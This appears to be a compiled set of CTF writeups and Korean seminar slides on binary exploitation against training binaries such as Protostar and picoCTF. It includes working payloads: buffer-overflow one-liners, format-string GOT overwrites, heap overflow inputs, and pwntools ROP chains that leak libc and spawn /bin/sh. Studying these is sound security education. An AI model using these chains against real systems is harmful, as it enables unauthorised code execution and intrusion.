<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-2o2l2h
description: CTF writeups and security challenges by 2O2L2H.
---

# Writeups by 2O2L2H

Source repository: `/repos/2O2L2H`

## Repository Index

- awesome-ctf-wargame/README.md
- awesome-ctf-wargame/wargame/protostar/stack/README.md
- awesome-ctf-wargame/wargame/protostar/heap/heap0/README.md
- awesome-ctf-wargame/wargame/protostar/heap/heap1/README.md
- awesome-ctf-wargame/wargame/protostar/heap/heap2/README.md
- awesome-ctf-wargame/seminar/topic/gdb-and-its-friends/README.md
- awesome-ctf-wargame/seminar/topic/how-to-use-jekyll-blog/how-to-use-jekyll-blog.md
- awesome-ctf-wargame/seminar/topic/radare2/README.md
- awesome-ctf-wargame/seminar/topic/system_call_rop/README.md
- awesome-ctf-wargame/seminar/book/ctf-challenge/chap.02/README.md
- awesome-ctf-wargame/seminar/book/ctf-challenge/chap.05/README.md
- awesome-ctf-wargame/ctf/2017/picoctf/shells/README.md

## Writeup Content


### File: awesome-ctf-wargame/README.md

# awesome-ctf-wargame

**Writeup oriented CTF skill improvement**

The corresponding ctf problem and wargame will be curated based on each required skill. 
:exclamation:  You may need the login account for browsing each wargame properly.

## [*] System hacking / Pwnable

### Basic introduction

- [Pwning Pwnables](https://dc416.com/wp-content/uploads/2016/07/Session-2-Harold-Rodriguez-Pwning-pwnables.pdf)

###  Wargames :pencil: 

| Difficulty | Wargames | 
|------------|----------|
| Easy | [(Exploit-exercise) Protostar](https://exploit-exercises.com/protostar/) |
| Medium | [(Root-me) App System](https://www.root-me.org/en/Challenges/App-System/), [(PwnerRank) Binary Exploitation](https://www.pwnerrank.com/categories/binary-exploitation/) |
| High | [Pwnable.kr](http://pwnable.kr/) |

### [+] BoF (Buffer Overflow)

- Overwrite local variable
    - [Easy | x86] : [(Protostar) Stack0](https://exploit-exercises.com/protostar/stack0/), [(Protostar) Stack1](https://exploit-exercises.com/protostar/stack1/), [(root-me) x86 BoF basic1](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1)
- Environment variable usage
    - [Easy | x86] : [(Protostar) Stack2](https://exploit-exercises.com/protostar/stack2/), [(root-me) x86 basic4](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4)
- Overwrite EIP (to be other function like flag printing)
    - [Easy | x86] : [picoctf-2013/rop1](https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-1),  [(Protostar) Stack3](https://exploit-exercises.com/protostar/stack3/), [(Protostar) Stack4](https://exploit-exercises.com/protostar/stack4/), [(root-me) x86 BoF basic2](https://www.root-me.org/en/Challenges/App-System/) 
    - [Easy | x64] : [(root-me) x64 BoF basic](https://www.root-me.org/en/Challenges/App-System/ELF-x64-Stack-buffer-overflow-basic)

### Overwrite EIP + shellCode injection

| Technique | Knowledge     |  Best Training :thumbsup: |
|-----------|---------------|-----------|
| shellcode injection | **shellcode**   | [pico-ctf-2013/overflow-4](https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/overflow-4)  |


- [Easy | x86] : [(Protostar) Stack5](https://exploit-exercises.com/protostar/stack5/)

### Ret2PLT, Ret2Libc, ROP

- [Easy | x86] : [pico-ctf-2013/rop2](https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-2)


### Threat Mitigation Bypass

#### ASLR : **Mem Leak**

| Technique | Knowledge     |  Best Training :thumbsup: |
|-----------|---------------|-----------|
| ASLR Bypass | **ROP, Mem leak**  |  [pico ctf 2013/rop3](https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-3)         |

#### Canary

#### PIE

| Technique | Knowledge     |  Best Training :thumbsup: |
|-----------|---------------|-----------|
| Address Calac  | **ROP, Mem Leak, Address offset** | [defcon 2015 / r0pbaby](https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby) |


### [+] Format String

#### Arbitrary memory read

#### Direct Parameter Access (`n$`)

#### Arbitrary memory write using `%n`

- [Easy | x86] : [Protostar: Format1](https://exploit-exercises.com/protostar/format1/) |


### [+] Heap Exploitation

[shellphish/how2heap: A repository for learning various heap exploitation techniques.](https://github.com/shellphish/how2heap) :star2: 

### [+] Exploitation technique  :star2:

![img](https://raw.githubusercontent.com/2O2L2H/awesome-ctf-wargame/master/roadmap/pwnable/pwnable.png)

[@Pwning Pwnables](https://dc416.com/wp-content/uploads/2016/07/Session-2-Harold-Rodriguez-Pwning-pwnables.pdf)

- **Jump to payload**
    - ret2reg or jump to payload if the stack is executable and addresses aren’t randomized 
- **GOT overwrite**
    - Commonly used in format string exploitation
    - Overwrite pointer in GOT with pointer to another location
- **Code re-use (ret2libc, ret2plt, ROP)**
    - Make use of existing code and instructions to exploit the binary 

### [+] TIP & Tools  :+1: 

- GDB enhancer : [2O2L2H/gdb-switcher](https://github.com/2O2L2H/gdb-switcher)
    - gef : Multi-Architecture GDB Enhanced Features for Exploiters & Reverse-Engineers : [:octocat:](https://github.com/hugsy/gef)
    - peda: PEDA - Python Exploit Development Assistance for GDB [:octocat:](https://github.com/longld/peda)
    - pwndbg: Exploit Development and Reverse Engineering with GDB Made Easy [:octocat:](https://github.com/pwndbg/pwndbg)
- Exploit frameworks
    - Generate and search pattern string for exploit development : [exploit-pattern @github](https://github.com/Svenito/exploit-pattern)
    - CTF framework and exploit development library [pwntools @github](https://github.com/Gallopsled/pwntools)
    - hellman/libformatstr: Simplify format string exploitation. [libformatstr @github](https://github.com/hellman/libformatstr)
- ROP tools
    - Ropper : find gadgets to build rop chains for different architectures (x86/x86_64, ARM/ARM64, MIPS, PowerPC) : [Ropper](https://github.com/sashs/Ropper)
    - ROPGadget : search your gadgets on your binaries to facilitate your ROP exploitation. ROPgadget supports ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC and MIPS architectures. : [ROPGadget](https://github.com/JonathanSalwan/ROPgadget)
- LIBC database
    - niklasb/libc-database: Build a database of libc offsets to simplify exploitation : [libc-database](https://github.com/niklasb/libc-database)



## [*] Cryptography

### [+] Caesar cryptography

### [+]  AES

### [+]  RSA


## [*] Forensics


## [*] Web

### [+]  SQL Injection

### [+]  XSS (Cross-site Scripting)







### File: awesome-ctf-wargame/ctf/2017/picoctf/shells/README.md

## shells

> picoctf

##### win() : target address

```bash
$ objdump -D shells | grep win
08048540 <win>:
```

```bash
$ (python -c 'print "\x40\x85\x04\x08"';cat)|./shells
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
id
Segmentation fault (core dumped)
```

##### Segmentation Fault

```bash
(python -c 'print "\x40\x85\x04\x08"') > input
```

```bash
b *vuln+109 #read()
b *vuln+114

(gdb) r < input

<stack>
a
stuff
0

(gdb) x/32x stuff_addr
08048540 000000000 00000000 ...
```

```bash
gef➤  
0xf7fd5000 in ?? ()
```

##### shellcode : push + win()_addr + ret

```
gef➤  disas /r main
Dump of assembler code for function main:
   0x08048610 <+0>: 8d 4c 24 04 lea    ecx,[esp+0x4]
   0x08048614 <+4>: 83 e4 f0    and    esp,0xfffffff0
   0x08048617 <+7>: ff 71 fc    push   DWORD PTR [ecx-0x4]
   0x0804861a <+10>:    55  push   ebp
   0x0804861b <+11>:    89 e5   mov    ebp,esp
   0x0804861d <+13>:    51  push   ecx
   0x0804861e <+14>:    83 ec 04    sub    esp,0x4
   0x08048621 <+17>:    83 ec 0c    sub    esp,0xc
   0x08048624 <+20>:    68 74 87 04 08  push   0x8048774
   0x08048629 <+25>:    e8 b2 fd ff ff  call   0x80483e0 <puts@plt>
   0x0804862e <+30>:    83 c4 10    add    esp,0x10
   0x08048631 <+33>:    83 ec 0c    sub    esp,0xc
   0x08048634 <+36>:    68 ac 87 04 08  push   0x80487ac <====== *
   0x08048639 <+41>:    e8 a2 fd ff ff  call   0x80483e0 <puts@plt>
   0x0804863e <+46>:    83 c4 10    add    esp,0x10
   0x08048641 <+49>:    a1 60 9a 04 08  mov    eax,ds:0x8049a60
   0x08048646 <+54>:    83 ec 0c    sub    esp,0xc
   0x08048649 <+57>:    50  push   eax
   0x0804864a <+58>:    e8 81 fd ff ff  call   0x80483d0 <fflush@plt>
   0x0804864f <+63>:    83 c4 10    add    esp,0x10
   0x08048652 <+66>:    e8 09 ff ff ff  call   0x8048560 <vuln>
   0x08048657 <+71>:    b8 00 00 00 00  mov    eax,0x0
   0x0804865c <+76>:    8b 4d fc    mov    ecx,DWORD PTR [ebp-0x4]
   0x0804865f <+79>:    c9  leave  
   0x08048660 <+80>:    8d 61 fc    lea    esp,[ecx-0x4]
   0x08048663 <+83>:    c3  ret    <====== **
```

```
(python -c 'print "\x68"+"\x40\x85\x04\x08"+"\xc3"';cat)|nc shell2017.picoctf.com 40976
```



### File: awesome-ctf-wargame/seminar/book/ctf-challenge/chap.02/README.md

footer: © 2O2L2H Book/Seminar, 2017
slidenumbers: true

# [fit] Chap2. PWN

---
# binary

- static vs dynamic
  - `statically linked`
  - `dynamically linked` = binary + `libc` + ...
- stripped
  - `not stripped` : symbol exists like `main()`, `open()`, ...
  - `stripped` : **no symbol**, should use **address**.



---
# [fit] Threat Mitigation

---
# `checksec`

```
pwndbg> checksec
[*] '/.../ctf/2017/hu37_hf2017/pwnable/rr2l/Pwnable_RR2L/attackme'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

gef> checksec
[+] checksec for '/.../ctf/2017/hu37_hf2017/pwnable/shallwedance/shellwedance'
Canary                        : Yes
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Full
```



---
# NX bit

- No eXecute bit
- DEP (Data Executin Prevention) @windows
- 메모리 상에서 실행될 필요가 없는 데이터를 실행 불가능하도록 설정. shellCode 가 stack 에서 실행 불가.

```bash
$ gcc ... -z execstack
```

---
# [fit] ASLR (Address Space Layout Randomization)

- 스택, 힙, 공유 라이브러리 등을 메모리에 적재할 때 주소의 일부를 랜덤화
- **Code 영역 포함되지 않음.**
- Host 에 설정하는 것으로 바이너리 만으로 확인 불가.

```bash
# Disable
$ sudo sysctl -w kernel.randomize_va_space=0
# Enable
$ sudo sysctl -w kernel.randomize_va_space=2
```


---
# [fit] Stack Smash Protection (a.k.a Canary)

- 스택 프레임의 **로컬 변수 영역과 Saved EBP 사이에 Canary** 라는 값을 넣어서 함수가 종료가 될 때 그 값이 다시 써졌는지 여부를 판별
- 난수 사용. `0xXXXXXX00` (little-endian) 맨 앞자리가 NULL 바이트가 되는 값으로 설정.
    - 로컬 변수에 할당한 문자열이 NULL 바이트로 끝나지 않았을 때 문자열 출력으로 카나리가 유출되는 것을 방지하는 효과 

```bash
$ gcc ... -fno-stack-protector
```

![left fit](./fig/canary.jpg)

---
# [fit] RELRO (RELocation ReadOnly)

- 메모리에 배치된 데이터의 어느 부분에 대해 Read Only 속성 부여할 것인지를 결정.

- `No RELRO` : GOT writable
- `Partial RELRO(Lazy)` : GOT writable
- `Full RELRO(now)` : GOT readonly
    - 프로그램 시작 할 때 라이브러리 주소를 모두 캐시한 이후에 GOT 영역을 read only 변

---
# [fit] PIE (Position Independent Executable)

- 실행 코드 내의 주소 참조를 모두 상대 주소로 만들어서 실행 파일이 메모리의 어느 위치에 위치하더라도 성공적으로 실행될 수 있게 컴파일된 실행 파일
- ASLR 로는 할 수 없는 실행 파일의 위치 주소를 무작위로 만들 수 있음.
- Exploit 시 이미 알려진 주소가 전혀 없기 때문에 **기본적으로 주소 누수로부터 공격을 시작**

---
# [fit] Format String Bug


---
# Format String

![left fit](./fig/format_string.jpg)

- 값 : `%x`, `%p`
- 포인터 : `%s`, `%n`


---

`fsb.c`

```c
#include <stdio.h>
int secret = 0x12345678;

int main(int argc, char *argv[])
{
  char str[128];

  fgets(str, 128, stdin);
  printf(str);

  printf("secret = 0x%x\n", secret);
  return 0;
}
```


---

![inline fit](./fig/stack.png)

```
AAAA,0x80,0xf7fb25a0,0x565555f7,0x41414141,0x2c70252c,0x252c7025,0x70252c70,...
```

---

![fit](./fig/stack2.png)

---
# Analysis : `%x`, `%p`

# Read : `%s`

# Write : `%n`

- `%n`이 사용되기 직전에 출력된 문자들의 수가 **`%n`에 대응하는 수에 저장**


---
### [#1] `fsb-ex1.c`

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
  int pos, x=235, y=93;
  printf("%d %n %d\n", x, &pos, y);
  printf("The offset was %d\n", pos);
}

```


---
```c
#include <stdio.h>

int main(int argc, char *argv[])
{
  int pos, x=235, y=93;
  printf("%d %n %d\n", x, &pos, y);
  printf("The offset was %d\n", pos);
}

```

```bash
$ ./fsb-ex1
235  93
The offset was 4
```

---
### [#2] `fsb-ex2.c`

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
  int pos, x=235, y=93;
  printf("%d  %n %d\n", x, &pos, y);
  printf("The offset was %d\n", pos);
}
```

---
### [#2] `fsb-ex2.c`

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
  int pos, x=235, y=93;
  printf("%d  %n %d\n", x, &pos, y);
  printf("The offset was %d\n", pos);
}
```

```bash
$ ./fsb-ex2
235   93
The offset was 5
```



---

`fsb-write.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
  char text[1024];
  static int test_val = -72;

  if(argc<2) {
    printf("사용법: %s <출력할 테스트>\n", argv[0]);
    exit(0);
  }

  strcpy(text, argv[1]);

  printf("[+] Good example:\n");
  printf("%s\n", text);

  printf("[-] Bad example:\n");
  printf(text);

  printf("\n[*] test_val @ %p = %d, %p\n", &test_val, test_val, test_val);

  return 0;
}
```


---
# How to attack

![left fit](./fig/stack.png)

- 입력한 값 중에서 **어느 형식 지정자**에서 출력되는지 확인.

```
AAAA,0x80,0xf7fb25a0,0x565555f7,0x41414141,0x2c70252c,
```

- `AAAA%4$x`
- Read : `AAAA%4$s`

- `%n` : 4 bytes
- `%hn` : 2 bytes
- `%hhn` : 1 bytes

---

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
  char str[128];

  fgets(str, 128, stdin);
  printf(str);

  fgets(str, 128, stdin);
  printf("%d\n", strlen(str));

  return 0;
}
```

---

`AAAA%4$n`  : 네번째 출력 

```
pwndbg> r
Starting program: /.../chap.02/format_string/got

AAAA,%8p,%8p,%8p,%8p,%8p,%8p,%8p,%8p,%8p,...

AAAA,    0x80,0xf7fb25a0,0xf7e8d9ab,0x41414141,0x7038252c,0x7038252c,...
```

- `strlen_got` 에 `system_addr` 로 write

```
pwndbg> p system
$1 = {<text variable, no debug info>} 0xf7e37060 <__libc_system>

pwndbg> x/10i 0x8048370
   0x8048370 <strlen@plt>:      jmp    DWORD PTR ds:0x804a014
```





### File: awesome-ctf-wargame/seminar/book/ctf-challenge/chap.05/README.md

footer: © 2O2L2H Book/Seminar, 2017
slidenumbers: true

# [fit] ROP & Memory Leak

### CTF 정보보안 콘테스트 챌린지북

### May 31, 2017
### 2O2L2H/humb1ec0ding

```
/seminar/book/capture-the-flag-hacking-technique/chap.05
```

---
# [fit] Function flow control

- `ret`
- normal `call function`
- `ret` + `call fuction`
    - BoF 시에 `ret` 로 `$eip` control.
    - 이 경우 stack 을 `call function` 한 것과 동일하게 구성한다면 ?
    - `call function` 과 차이점은 ?
    - `call function` 계속 수행하려면 ?

![left fit](./fig/rop1.jpg)

---

# [fit] `ret` + `call function` stack configuration

![inline](./fig/rop2.jpg)

---

# [fit] `ret` + `call function` chainging

- 앞 함수 `return` == `pop-ret` gadget
    - Stack adjustment
    - `pop *{# of argument} - ret`

![inline fit](./fig/rop3.jpg)

![left fit](./fig/rop4.jpg)

---
# [fit] #1 Simple Memory Leak

---

`main()` stack setup 이 다소 달라서 `vuln()` 함수에서 수행하도록 수정.

```c
#include <stdio.h>
#include <string.h>

void vuln()
{
  char msg[] = "Hello\n";
  char buf[32];
  write(1, msg, strlen(msg));
  read(0, buf, 128);
  return 0;
}

int main(int argc, char *argv[])
{
  vuln();
}
```


---
### Compile @32bit Ubuntu

```bash
$  uname -a 
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:06:14 UTC 2016 i686 i686 i686 GNU/Linux

$ ./compile.sh bof4

$ file ./bof4
./bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, 
BuildID[sha1]=1f60ca83839e67a4b06936f9d226419590bcfe89, not stripped
```

---
### BoF

```bash
$ ./pattern.py 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa...8Am9An0An1An2A

# GDB exeuction
Program received signal SIGSEGV, Segmentation fault.
0x41376241 in ?? ()

$ ./pattern.py 0x41376241
Pattern 0x41376241 first occurrence at position 51 in pattern.
```

---
### `plt`, `got` address check

- `write@plt` : `0x08048350`
- `write@got` : `0x0804a018`


```bash
$ objdump -d -M intel -j .plt ./bof4

08048350 <write@plt>:
 8048350:       ff 25 18 a0 04 08       jmp    DWORD PTR ds:0x804a018
 8048356:       68 18 00 00 00          push   0x18
 804835b:       e9 b0 ff ff ff          jmp    8048310 <_init+0x24>

```


---
### `rel` : offset in libc

```bash
# Ubuntu 16.04 x86
$  nm -D /lib/i386-linux-gnu/libc.so.6 |grep write
000d5c70 W write

# Ubuntu 17.10 x64
$  nm -D /lib32/libc.so.6  |grep write
000d6bb0 W write
```

---
### Exploit

```python
from pwn import *

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./bof4")
else:
    conn = remote(HOST, PORT)
```

---

```python
write_plt = 0x08048350
write_got = 0x0804a018

gdb.attach(conn)      # WoW !!!

ROP = "A" * 51
ROP += p32(write_plt)
ROP += "BBBB"
ROP += p32(1)
ROP += p32(write_got)
ROP += p32(4)

print conn.recv(1024)
conn.sendline(ROP)
print hex(u32(conn.recv(4)))

#conn.interactive()
```


---
### Execution

```bash
$ python leak.py
[+] Starting local process './bof4': pid 13755
[*] running in new terminal: /usr/bin/gdb -q  "/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/seminar/book/capture-the-flag-hacking-technique/chap.05/bof4" 13755
[+] Waiting for debugger: Done
Hello

0xf7617bb0
```


---
# [fit] #2 Advanced Memory Leak

- ASLR 걸려있는 서버
- Remote 로 `system("/bin/sh")`  수행 
    - `system()` PLT 에 없으므로 ASLR 적용된 주소 알아야 함.
    - Where to find `/bin/sh` string ?

---
###  How to bypass ASLR

- ASLR 시 바뀌는 부분과 안 바뀌는 부분 ?
    - **Changed** : Stack, Heap, mmap(), base address of `libc`, ...
    - **Not changed** : Code, Offset in `libc`
- `actual address` = `libc_base` + `offset_in_libc`
    -  `actual address` **leak** = `libc_base` in server  + `offset_in_libc`
    - `system actual address` = `libc_base` + `offset_in_libc`

---

![fit](./fig/memory_leak.png)

---


```python

# write(1, __libc_start_main_got, 4)
ROP += p32(write_plt)
ROP += p32(pop3ret)
ROP += p32(1)
ROP += p32(__libc_start_main_got)
ROP += p32(4)

# read(0, __libc_start_main_got, 20)
ROP += p32(read_plt)
ROP += p32(pop3ret)
ROP += p32(0)
ROP += p32(__libc_start_main_got)
ROP += p32(20)

# system('bin/sh')
ROP += p32(__libc_start_main_plt)
ROP += p32(0xBBBB)
ROP += p32(__libc_start_main_got+4)
```

---

```python
print conn.recv(1024)
conn.sendline(ROP)
time.sleep(0.1)

__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/sh")
time.sleep(0.1)

conn.interactive()
```

---
# [fit] Threat mitigation bypass

- NX : 스택에서의 코드 실행 방지
    * ROP : ret2plt, ret2libc, rop, ...
- Stack Canary : 스택 프레임 무결성 판단
    * Memory Leak, Blind ROP 
- ASLR : 스택, 힙, 라이브러리의 주소 랜덤화
    * Memory Leak, Brute Force (32bit)

---

#### dynamically linked + not stripped

- NX 도 없고 평범하니 Shellcode 주입하고 BOF 부터

#### stack canary + NX

- NX 가 있으니 RTL / ROP 가능성
- Dynamically linked 라 gadget 을 찾는 것만이 다는 아닐 수 있음.
- Canary 가 있으니 FSB 혹은 Canary Leak 이 되는 Point 가 있을 수 있음.

---
#### statically linked + stack canary + NX

- NX 가 있으니 RTL / ROP 가능성
- Statically linked 이니 gadget 구하기 용이함.
- Canary 가 있으니 FSB 혹은 Canary Leak 이 되는 Point 가 있을 가능성.





### File: awesome-ctf-wargame/seminar/topic/gdb-and-its-friends/README.md

footer: GDB & its Friends © 2O2L2H Seminar, 2017
slidenumbers: true

# [fit] GDB & its Friends

---
# gdb

- Initial break point 가장 불편 ?

- `b*main`
- `r`


---
# gef

- `gef help` : Menu listup
- `entry-break` : Auto initial breakpoint
- `ctx` : context
- pros
  - `entry-break`
  - stack에서 `$esp`, `$ebp` 표
- cons



---
#  peda

- `peda` : Menu listup
- `context` : context menu
- `pdisas` : colorful display
- `elfsymbol`
- `find`
    `find /bin/sh libc`
- `ropgadget`
```
ret = 0x5555555544c0
popret = 0x555555554aab
pop2ret = 0x555555554eb1
addesp_8 = 0x555555554956
addesp_1064 = 0x555555554ea3
```

---
#  pwndbg

- `pwndbg` : menu print
- `entry` : Initial break point
- `ropper` : only print offset
- `plt`

---
#  [fit] Comparison : Screen, Easy to debug

- [O] gef : Best
- [] pwndbg : too small.
- [] peda

---
##  Comparison : Initial break

- [O] gef : `entry-break` - auto break on `__libc_start_main` 
- [0] peda : `break`
- [] pwndbg

---
## Comparison : stack canary : gef

- parent의 canary가 정해지면, 하위 child의 canary는 parent의 canary와 모두 동일하다.
- [0] gef

```
gef)  canary
[+] Found AT_RANDOM at 0xffffd0ab, reading 4 bytes
[+] The canary of process 1448 is 0x7f4c1300
```

- [0] pwndbg

```
pwndbg> canary
AT_RANDOM=0xffffd0a
```

- [x] peda


---
#  Comparison : string find

- [O] peda
- [] gef
- [] pwndbg

- Network 형태가 아니라 서버에 접속해서 풀 수 있는 문제라면 직접 주소 구하기 쉽다. 특히 libc 안에...


---
# [fit] Tool

---
# rpi++

- `libc` 와 같은 경우  standalone 으로 gadget offset 찾아야 할 필요 있음.
- gdb 에서 libc gadget print 하면 화면 너무 많이 넘어가 찾을 수 없음.
- [Downloads · 0vercl0k/rp](https://github.com/0vercl0k/rp/downloads)

```bash
$  rp-lin-x64
DESCRIPTION:
rp++ allows you to find ROP gadgets in pe/elf/mach-o x86/x64 binaries.
NB: The original idea comes from (@jonathansalwan) and its 'ROPGadget' tool.

USAGE:
./rp++ [-hv] [-f <binary path>] [-i <1,2,3>] [-r <positive int>] [--raw=<archi>] [--atsyntax] [--unique] [--search-hexa=<\x90A\x90>] [--search-int=<int in hex>]

OPTIONS:
  -f, --file=<binary path>  give binary path
  -i, --info=<1,2,3>        display information about the binary header
  -r, --rop=<positive int>  find useful gadget for your future exploits, arg is the gadget maximum size in instructions
  --raw=<archi>             find gadgets in a raw file, 'archi' must be in the following list: x86, x64
  --atsyntax                enable the at&t syntax
  --unique                  display only unique gadget
  --search-hexa=<\x90A\x90> try to find hex values
  --search-int=<int in hex> try to find a pointer on a specific integer value
  -h, --help                print this help and exit
  -v, --version             print version information and exit

$ rp-lin-x64 -f libc.so.6 -r 4
```








### File: awesome-ctf-wargame/seminar/topic/radare2/README.md

footer: radare2 © 2O2L2H Seminar, 2017
slidenumbers: true

# [fit] radare2

[radare/radare2: unix-like reverse engineering framework and commandline tools](https://github.com/radare/radare2)

---

## Installation

```bash
$ sys/install.sh
```

## Basic usage

```bash
$ radare2
Usage: r2 [-ACdfLMnNqStuvwzX] [-P patch] [-p prj] [-a arch] [-b bits] [-i file]
          [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|=

$ r2
Usage: r2 [-ACdfLMnNqStuvwzX] [-P patch] [-p prj] [-a arch] [-b bits] [-i file]
          [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|=
```

---

# Usage


```bash
$ r2 executable
$ r2 -d executable
```




### File: awesome-ctf-wargame/seminar/topic/system_call_rop/README.md

footer: © 2O2L2H Book/Seminar, 2017
slidenumbers: true

# [fit] System Call ROP 

### June 8, 2017   2O2L2H/humb1ec0ding

```
/awesome-ctf-wargame/seminar/topic/srop
```

---
# [fit] Linux System Calls

![left fit](./fig/linux-system-call.png)

- `int 80`
- system call number

---
# [fit] [Assembly System Calls](https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm)

![left fit](./fig/srop-arg.png)

- `eax` : system call number
- `ebx` : file descriptor - `stdin/out/err`
- `ecx` : buffer
- `edx` : siz


---
# system call : assembly

```
mov eax,1   ; system call number (sys_exit)
int 0x80    ; call kernel

mov edx,4   ; message length
mov ecx,msg ; message to write
mov ebx,1   ; file descriptor (stdout)
mov eax,4   ; system call number (sys_write)
int 0x80    ; call kernel
```

---
# gadget for system call

- pop reg, ret
- int 0x80, ret

### Useful exploit

- open("flag"), read(buf,size,), write(buf, size, )
- execve("/bin/sh", NULL, NULL)
- [security - system() vs execve() - Stack Overflow](https://stackoverflow.com/questions/27461936/system-vs-execve)



---
## read(0, e.bss(), 0x8)

```
ex += p32(pop_eax)              # pop eax
ex += p32(0x3)                  # number of systemcall sys_read
ex += p32(pop_edx_edx_ebx_ret)  # pop edx/ecx/ebx
ex += p32(0x8)                  # size of stdin
ex += p32(elf.bss())            # buf for stdin
ex += p32(0)                    # fd of stdin
ex += p32(int0x80)              # invoke system calls in Linux on x86
```

---
## execve("/bin/sh",NULL, NULL)

```
ex += p32(pop_eax)              # pop eax
ex += p32(0xb)                  # number of systemcall sys_execve
ex += p32(pop_edx_edx_ebx_ret)  # pop edx/ecx/ebx
ex += p32(0)                    # third argument of execve : NULL
ex += p32(0)                    # second argument of execve : NULL
ex += p32(elf.bss())            # first argument of execve : buf
ex += p32(int0x80)              # invoke system calls
```


---
# exec

PATH 에 등록된 디렉토리를 참고하여 다른 프로그램을 실행하고 종료

![inline fit](./fig/exec.png)

![inline fit](./fig/exec2.png)


---
# [fit] Defcon 2016 feedme

- Canary : fork child, bruteforce
- SROP : static linked, stripped






### File: awesome-ctf-wargame/wargame/protostar/heap/heap0/README.md

# Wargame / Protostar / Heap0

[Protostar Heap0 - Exploit Exercises](https://exploit-exercises.com/protostar/heap0/)

>This level introduces heap overflows and how they can influence code flow.
>
>This level is at /opt/protostar/bin/heap0


## Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));

  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);
  strcpy(d->name, argv[1]);

  f->fp();
}
```

## Analysis

```bash
$ ./heap0
data is at 0x804a008, fp is at 0x804a050
Segmentation fault
```


```
(gdb) p winner
$1 = {void (void)} 0x8048464 <winner>
(gdb) p nowinner
$2 = {void (void)} 0x8048478 <nowinner>
(gdb) p data
$3 = (struct here_cg_arc_record *) 0x0
(gdb) p &data
$4 = (struct here_cg_arc_record **) 0xb7fff884
```


`data[64]` 뒤에 `fp` function pointer 있을 것으로 생각되니깐... `64` bytes 이후에 `winner()` 함수 주소 설정.

```bash
$ $ ./heap0 $(python -c 'print "A"*64 + "\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level has not been passed
```

Exploit pattern 으로 다시 `fp` 주소 확인을 하면 72 bytes 뒤에 있네.

```bash
$ ./pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

$ ./pattern.py 0x41346341
Pattern 0x41346341 first occurrence at position 72 in pattern.
```

## Exploit

```bash
$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
```






### File: awesome-ctf-wargame/wargame/protostar/heap/heap1/README.md

# Wargame / Protostar / Heap1

[Protostar Heap1 - Exploit Exercises](https://exploit-exercises.com/protostar/heap1/)

>This level takes a look at code flow hijacking in data overwrite cases.
>This level is at /opt/protostar/bin/heap1


## Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```


## Initial execution

```bash
$ ./heap1
Segmentation fault (core dumped)

$ ./heap1 AAAA BBBB
and that's a wrap folks!

$ ltrace ./heap1 AAAA BBBB
__libc_start_main(0x80484b9, 3, 0xffffcdd4, 0x8048580 <unfinished ...>
malloc(8)                                                                                   = 0x804a008
malloc(8)                                                                                   = 0x804a018
malloc(8)                                                                                   = 0x804a028
malloc(8)                                                                                   = 0x804a038
strcpy(0x804a018, "AAAA")                                                                   = 0x804a018
strcpy(0x804a038, "BBBB")                                                                   = 0x804a038
puts("and that's a wrap folks!"and that's a wrap folks!
)                                                            = 25
+++ exited (status 25) +++
```


